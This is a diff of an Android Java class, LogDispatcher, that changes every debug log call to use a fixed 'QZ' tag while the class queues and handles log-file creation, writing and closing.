@@ -83,7 +83,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	 */
 	private void processQueue() {
 		Packet p;
-		// Log.d(TAG, "processQueue() Packets in Queue: " + q.size());
+		// Log.d("QZ", TAG + " processQueue() Packets in Queue: " + q.size());
 
 		if (q.size() == 0) {
 			return;
@@ -98,42 +98,42 @@ public class LogDispatcher extends Thread implements Runnable {
 
 		switch (p.getCommand()) {
 			case LogR.LOG_CREATE:
-				Log.d(TAG, "processQueue() got LOG_CREATE");
+				Log.d("QZ", TAG + " processQueue() got LOG_CREATE");
 				createLog(p);
 				break;
 
 			case LogR.LOG_ATOMIC:
-				Log.d(TAG, "processQueue() got LOG_ATOMIC");
+				Log.d("QZ", TAG + " processQueue() got LOG_ATOMIC");
 				atomicLog(p);
 				break;
 
 			case LogR.LOG_WRITE:
-				Log.d(TAG, "processQueue() got LOG_WRITE");
+				Log.d("QZ", TAG + " processQueue() got LOG_WRITE");
 				writeLog(p);
 				break;
 
 			case LogR.LOG_CLOSE:
-				Log.d(TAG, "processQueue() got LOG_CLOSE");
+				Log.d("QZ", TAG + " processQueue() got LOG_CLOSE");
 				closeLog(p);
 				break;
 
 			case LogR.LOG_REMOVE:
-				Log.d(TAG,"Error: " + "processQueue() got LOG_REMOVE: DEPRECATED");
+				Log.d("QZ", TAG + " Error: " + "processQueue() got LOG_REMOVE: DEPRECATED");
 				// removeLog(p);
 				break;
 
 			case LogR.LOG_REMOVEALL:
-				Log.d(TAG,"Error: " + "processQueue() got LOG_REMOVEALL: DEPRECATED");
+				Log.d("QZ", TAG + " Error: " + "processQueue() got LOG_REMOVEALL: DEPRECATED");
 				// removeAll();
 				break;
 
 			case LogR.LOG_WRITEMRK:
-				Log.d(TAG, "processQueue() got LOG_WRITEMRK");
+				Log.d("QZ", TAG + " processQueue() got LOG_WRITEMRK");
 				writeMarkup(p);
 				break;
 
 			default:
-				Log.d(TAG,"Error: " + "processQueue() got LOG_UNKNOWN");
+				Log.d("QZ", TAG + " Error: " + "processQueue() got LOG_UNKNOWN");
 				break;
 		}
 
@@ -164,7 +164,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	 */
 	@Override
 	public void run() {
-		Log.d(TAG, "LogDispatcher started");
+		Log.d("QZ", TAG + " LogDispatcher started");
 
 		// Create log directory
 		sdDir = new File(Path.logs());
@@ -185,7 +185,7 @@ public class LogDispatcher extends Thread implements Runnable {
 				if (halt == true) {
 					q.clear();
 					evidences.clear();
-					Log.d(TAG, "LogDispatcher closing");
+					Log.d("QZ", TAG + " LogDispatcher closing");
 					return;
 				}
 
@@ -262,7 +262,7 @@ public class LogDispatcher extends Thread implements Runnable {
 
 			return true;
 		} catch (final Exception e) {
-			Log.d(TAG, "LogDispatcher.createLog() exception detected");
+			Log.d("QZ", TAG + " LogDispatcher.createLog() exception detected");
 			e.printStackTrace();
 			return false;
 		}
@@ -315,7 +315,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	 */
 	private boolean writeLog(final Packet p) {
 		if (evidences.containsKey(p.getId()) == false) {
-			Log.d(TAG, "Requested log not found");
+			Log.d("QZ", TAG + " Requested log not found");
 			return false;
 		}
 
@@ -334,7 +334,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	 */
 	private boolean closeLog(final Packet p) {
 		if (evidences.containsKey(p.getId()) == false) {
-			Log.d(TAG, "Requested log not found");
+			Log.d("QZ", TAG + " Requested log not found");
 			return false;
 		}
 
